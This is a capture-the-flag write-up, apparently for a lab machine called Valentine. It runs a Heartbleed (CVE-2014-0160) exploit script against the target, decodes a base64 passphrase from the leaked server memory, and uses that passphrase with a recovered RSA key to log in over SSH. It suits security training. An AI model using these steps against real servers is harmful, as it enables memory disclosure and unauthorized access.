# Hearthbleed Exploit

# [CVE-2014-0160](https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py)

See the enumeration page.

```bash
──(kali㉿kali)-[10.10.14.8/23]-[~/htb/valentine/exploit]
└─$ python2 heartbleed.py 10.10.10.79 

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==0.-fQ........v9r1o5
```


# Let's decode the text
```bash
┌──(kali㉿kali)-[10.10.14.8/23]-[~/htb/valentine/exploit]
└─$ echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
heartbleedbelievethehype
```

The decoded text looks familiar, it is actually the *hype* that's familiar which is from http://10.10.10.79/dev/hype_key


# SSH

 We have the following information

* an rsa key
* a likely password

we can try bruteforcing ssh usernames but the file name itself reveals a lot, hype could be the username

```bash
┌──(kali㉿kali)-[10.10.14.8/23]-[~/htb/valentine/server]
└─$ ssh -l hype  -i hype_key  10.10.10.79
Enter passphrase for key 'hype_key': heartbleedbelievethehype
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ 
```

 Our assumptions turn out to be correct, username is **hype** and the passphrase of the key is **heartbleedbelievethehype**